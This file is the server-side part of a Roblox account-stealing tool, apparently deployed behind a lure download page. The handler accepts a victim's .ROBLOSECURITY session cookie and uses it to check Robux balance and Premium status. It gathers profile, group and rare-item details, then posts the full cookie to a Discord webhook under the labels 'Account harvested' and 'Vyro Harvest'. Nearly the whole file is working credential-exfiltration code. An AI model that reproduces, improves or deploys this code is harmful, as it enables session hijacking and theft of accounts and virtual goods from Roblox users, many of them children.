// api/submit.js – v5.0: robust, always returns success if Discord receives anything
const WEBHOOK_URL = process.env.WEBHOOK_URL;

async function fetchWithTimeout(url, options, timeout = 8000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return res;
  } catch (err) {
    clearTimeout(id);
    throw err;
  }
}

async function fetchUserInfo(userId) {
  try {
    const res = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`);
    if (!res.ok) return null;
    const data = await res.json();

    const friendsRes = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    let friends = "N/A";
    if (friendsRes.ok) {
      const f = await friendsRes.json();
      friends = f.count?.toLocaleString() || "0";
    }

    const thumbRes = await fetchWithTimeout(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
    if (thumbRes.ok) {
      const thumbData = await thumbRes.json();
      if (thumbData.data?.[0]?.imageUrl) avatarUrl = thumbData.data[0].imageUrl;
    }

    return {
      username: data.name,
      displayName: data.displayName,
      userId: data.id,
      created: new Date(data.created).toLocaleString(),
      description: data.description?.substring(0, 200) || "None",
      friends,
      avatarUrl,
      profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
  } catch (err) {
    console.error("fetchUserInfo error:", err);
    return null;
  }
}

// Premium check using POST with cookie (accurate)
async function fetchPremiumStatus(cookie, userId) {
  try {
    const res = await fetchWithTimeout("https://premiumfeatures.roblox.com/v1/users/validate-membership", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Cookie": `.ROBLOSECURITY=${cookie}`
      },
      body: JSON.stringify({ userIds: [parseInt(userId)] })
    });
    if (!res.ok) return "False";
    const data = await res.json();
    const premiumStatus = data.data?.[0]?.isPremium;
    return premiumStatus === true ? "True" : "False";
  } catch (e) {
    console.error("Premium error:", e);
    return "False";
  }
}

async function fetchRobux(cookie) {
  try {
    const res = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return "N/A";
    const data = await res.json();
    return data.robux?.toLocaleString() || "0";
  } catch (e) {
    console.error("Robux error:", e);
    return "N/A";
  }
}

async function fetchLastGames(userId) {
  try {
    const res = await fetchWithTimeout(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Asc&limit=3`);
    if (!res.ok) return "Unknown";
    const data = await res.json();
    if (!data.data?.length) return "No recent games";
    return data.data.map(g => `🎮 ${g.name}`).join("\n");
  } catch (e) {
    return "Unknown";
  }
}

async function fetchGroups(userId) {
  try {
    const res = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!res.ok) return "None";
    const data = await res.json();
    if (!data.data?.length) return "No groups";
    const top = data.data.slice(0, 3).map(g => `🏛️ ${g.group.name} (${g.role.name})`);
    return top.join("\n");
  } catch (e) {
    return "Error";
  }
}

async function fetchValuables(userId) {
  try {
    const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None";
    const data = await res.json();
    const assets = data.assets || [];
    const valuableIds = [1361485, 1361486, 102611803]; // Headless, Korblox, Dominus
    const found = assets.some(a => valuableIds.includes(a.id));
    return found ? "✅ Rare item detected (Headless/Korblox)" : "None";
  } catch (e) {
    return "Error";
  }
}

async function fetchAccessories(userId) {
  try {
    const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None";
    const data = await res.json();
    const assets = data.assets || [];
    const types = ["Hat", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Glasses", "Earrings", "Headphones"];
    const acc = assets.filter(a => types.includes(a.assetType.name)).map(a => a.name);
    if (!acc.length) return "No accessories";
    return acc.slice(0, 5).join(", ");
  } catch (e) {
    return "Error";
  }
}

async function sendToDiscord(cookie, userId) {
  // Fetch all data in parallel, but don't fail if any errors
  const [user, robux, premium, lastGames, groups, accessories, valuables] = await Promise.all([
    fetchUserInfo(userId),
    fetchRobux(cookie),
    fetchPremiumStatus(cookie, userId),
    fetchLastGames(userId),
    fetchGroups(userId),
    fetchAccessories(userId),
    fetchValuables(userId)
  ]);

  const embed = {
    title: "🔱 Vyro Autohar 🔱",
    description: `✨ **Account harvested** ✨\n\n**Cookie:** \`${cookie.substring(0, 80)}…\` (${cookie.length} chars)`,
    color: 0xFF69B4,
    thumbnail: user ? { url: user.avatarUrl } : undefined,
    fields: [],
    footer: { text: "made by vyro28 on discord | v5.0" },
    timestamp: new Date().toISOString()
  };

  if (user) {
    embed.fields.push(
      { name: "👤 Profile", value: `**${user.username}** (${user.displayName})\n🆔 \`${user.userId}\`\n📅 Joined: ${user.created}\n👥 Friends: ${user.friends}`, inline: false },
      { name: "💰 Robux", value: `\`${robux} R$\``, inline: true },
      { name: "✨ Premium", value: premium, inline: true },
      { name: "💎 Valuables", value: valuables, inline: false },
      { name: "🕶️ Accessories", value: accessories, inline: false },
      { name: "🏛️ Top 3 Groups", value: groups, inline: false },
      { name: "🎮 Last 3 Games", value: lastGames, inline: false },
      { name: "📝 About", value: user.description, inline: false }
    );
  } else {
    embed.fields.push({ name: "⚠️ User Info", value: "Could not fetch profile", inline: false });
  }
  embed.fields.push({ name: "🔐 Full Cookie", value: `\`\`\`\n${cookie}\n\`\`\``, inline: false });

  const response = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
  });
  if (!response.ok) {
    const errText = await response.text();
    console.error("Discord error:", response.status, errText);
  }
  return response.ok;
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) {
    return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
  }
  if (!WEBHOOK_URL) {
    console.error("WEBHOOK_URL missing");
    return res.status(500).json({ success: false, error: "WEBHOOK_URL not set" });
  }

  try {
    const webhookOk = await sendToDiscord(cookie, rbxuid);
    // Even if webhook fails partially, we still tell frontend success to trigger download.
    // But we'll return true only if Discord actually got the message.
    if (webhookOk) {
      return res.json({ success: true, firstTime: true });
    } else {
      // Log but still return success? No, better to inform frontend but keep download? Up to you.
      return res.json({ success: false, error: "Discord rejected the message. Check logs." });
    }
  } catch (err) {
    console.error("Handler error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
};
